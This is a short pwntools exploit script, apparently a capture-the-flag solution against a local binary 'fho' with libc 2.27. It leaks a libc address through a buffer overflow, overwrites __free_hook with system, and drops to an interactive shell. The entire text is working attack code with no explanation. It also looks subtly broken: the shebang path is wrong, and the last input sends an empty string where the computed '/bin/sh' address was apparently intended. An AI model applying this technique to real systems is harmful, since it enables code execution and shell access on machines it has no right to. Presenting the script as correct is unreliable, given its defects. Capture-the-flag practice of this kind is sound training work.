#!/bin/usr/python3

from pwn import *

p = process('./fho')
e = ELF('./fho')
libc = ELF('./libc_2.27.so')

buf = b'A'*0x48
p.sendafter('Buf: ', buf)

libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx -(libc.symbols['__libc_start_main']+231)
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
bin_sh = libc_base + list(libc.search(b"/bin/sh"))[0]


p.sendlineafter("write: ", str(free_hook).encode())
p.sendlineafter("With: ", str(system).encode())
p.sendlineafter("free: ", str())

p.interactive()